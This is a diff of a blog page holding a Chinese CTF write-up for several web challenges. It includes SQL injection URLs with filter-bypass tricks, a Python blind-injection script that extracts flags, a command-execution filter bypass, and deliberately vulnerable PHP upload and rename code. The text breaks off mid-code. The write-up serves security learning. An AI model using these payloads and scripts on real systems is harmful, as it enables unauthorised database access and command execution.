+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20or%201&#x3D;1--+</span><br></pre></td></tr></table></figure>
 <p>无正确回显，猜测可能是or有问题，换 <code>||</code> 试一下</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;length(database())--+</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;length(database())--+</span><br></pre></td></tr></table></figure>
 <p>果然返回正确，数据库长度为3</p>
 <p>题目过滤了or，但是可以绕过</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20oorr%201&#x3D;1--+</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-1%27%20oorr%201&#x3D;1--+</span><br></pre></td></tr></table></figure>
 <p>爆列数</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;3 oorrder by 3--+</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;3 oorrder by 3--+</span><br></pre></td></tr></table></figure>
 <p>共有三列</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,database(),3--+</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,database(),3--+</span><br></pre></td></tr></table></figure>
 <p>database:ctf</p>
 <p>接下来就是常规的注入了</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>
 <p>table：ctf,flag </p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>
 <p>列名：id,flag </p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,flag,3 from flag--+</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.199:32793&#x2F;list.php?id&#x3D;-2%27 || 3&#x3D;2 ununionion selselectect 1,flag,3 from flag--+</span><br></pre></td></tr></table></figure>
 <p>居然还有题目..</p>
 <blockquote>
 <p>flag in admin_08163314/exec.php </p>
@@ -133,7 +142,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></he
 <p>访问一下，是个命令执行界面，过滤了空格，可用<code>$IFS</code>绕过，尝试列根目录但是失败了，猜测可能是<code>/</code>被过滤了，但是 <code>* .</code>没有被过滤，可以用来读文件exec.php</p>
 <p><img src="https://i.loli.net/2019/01/26/5c4c5df37356a.png" alt></p>
 <p>可以得到源码</p>
-<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+|\/| )/i"</span>;</span><br><span class="line">	$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">	$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">	system($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+|\/| )/i"</span>;</span><br><span class="line">	$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">	$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">	system($cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>知道了过滤规则就好办了，接下里可以用base64编码绕过，列根目录</p>
 <p><img src="https://i.loli.net/2019/01/26/5c4c5e68be087.png" alt></p>
 <p><img src="https://i.loli.net/2019/01/26/5c4c5e99549bc.png" alt></p>
@@ -142,27 +151,21 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></he
 <p><img src="https://i.loli.net/2019/01/26/5c4c5f1453698.png" alt></p>
 <p><img src="https://i.loli.net/2019/01/26/5c4c5f7396879.png" alt></p>
 <p><img src="https://i.loli.net/2019/01/26/5c4c5f7398de3.png" alt></p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3570d4d9c72a19c889140674827eeca5&#125;</span><br></pre></td></tr></table></div></figure>
-
-        <h2 id="SimpleSQLi2">
-          <a href="#SimpleSQLi2" class="heading-link"><i class="fas fa-link"></i></a>SimpleSQLi2</h2>
-      <p>fuzz测试了一下感觉是数字型注入</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;-1%20||%201&#x3D;1</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3570d4d9c72a19c889140674827eeca5&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="SimpleSQLi2"><a href="#SimpleSQLi2" class="headerlink" title="SimpleSQLi2"></a>SimpleSQLi2</h2><p>fuzz测试了一下感觉是数字型注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;-1%20||%201&#x3D;1</span><br></pre></td></tr></table></figure>
 <p>接下来测试过滤规则</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;2&gt;2 || length(&#39;seleselectct&#39;)&#x3D;6</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;2&gt;2 || length(&#39;seleselectct&#39;)&#x3D;6</span><br></pre></td></tr></table></figure>
 <p>测试发现过滤了 <code>select,or,空格</code>，空格可用<code>/**/</code>绕过，select等可双写绕过，接下来只需要编写盲注脚本即可</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words = <span class="string">"2019~"</span></span><br><span class="line">url = <span class="string">"http://bxs.cumt.edu.cn:30010/test/index.php?id="</span></span><br><span class="line">table = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># emails,flagishere,referers,uagents,users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># Id,flag</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"2&gt;2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">128</span>):</span><br><span class="line">		res = requests.get(url+payload.format(j,i)).text</span><br><span class="line">		<span class="keyword">if</span> words <span class="keyword">in</span> res:</span><br><span class="line">			table += chr(i)</span><br><span class="line">			print(table)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words = <span class="string">"2019~"</span></span><br><span class="line">url = <span class="string">"http://bxs.cumt.edu.cn:30010/test/index.php?id="</span></span><br><span class="line">table = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># emails,flagishere,referers,uagents,users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># Id,flag</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"2&gt;2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">128</span>):</span><br><span class="line">		res = requests.get(url+payload.format(j,i)).text</span><br><span class="line">		<span class="keyword">if</span> words <span class="keyword">in</span> res:</span><br><span class="line">			table += chr(i)</span><br><span class="line">			print(table)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 <p>可以得到flag如下</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4nother_SimPLE_SQLi_0rek1&#125;</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4nother_SimPLE_SQLi_0rek1&#125;</span><br></pre></td></tr></table></figure>
 <p>后来和出题人交流了一下，思路非预期2333~</p>
-
-        <h2 id="文件管理系统">
-          <a href="#文件管理系统" class="heading-link"><i class="fas fa-link"></i></a>文件管理系统</h2>
-      <p>网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个<code>xxxx.jpg</code>，然后修改文件名，通过修改文件名为 <code>xxxx.php%00.jpg</code> 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码<code>www.zip</code></p>
+<h2 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h2><p>网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个<code>xxxx.jpg</code>，然后修改文件名，通过修改文件名为 <code>xxxx.php%00.jpg</code> 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码<code>www.zip</code></p>
 <p>核心代码如下</p>
 <p>upload.php</p>
-<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">        $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];       </span><br><span class="line">        $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line">        $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $file["tmp_name"], ROOT . UPLOAD_DIR . $name;</span></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">            $re = $db-&gt;query($sql);</span><br><span class="line">            <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">                print_r($db-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_r(error_get_last());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">rename.php</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">        $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            print_r($db-&gt;errorInfo());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">            rename($oldname, $newname);</span><br><span class="line">            $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
-<p>由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 <span class="exturl"><a class="exturl__link" href="http://drops.xmd5.com/static/drops/tips-10564.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-10564.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，而且还给出了攻击流程，本题是个二次注入。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">        $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];       </span><br><span class="line">        $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line">        $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $file["tmp_name"], ROOT . UPLOAD_DIR . $name;</span></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">            $re = $db-&gt;query($sql);</span><br><span class="line">            <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">                print_r($db-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_r(error_get_last());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">rename.php</span><br><span 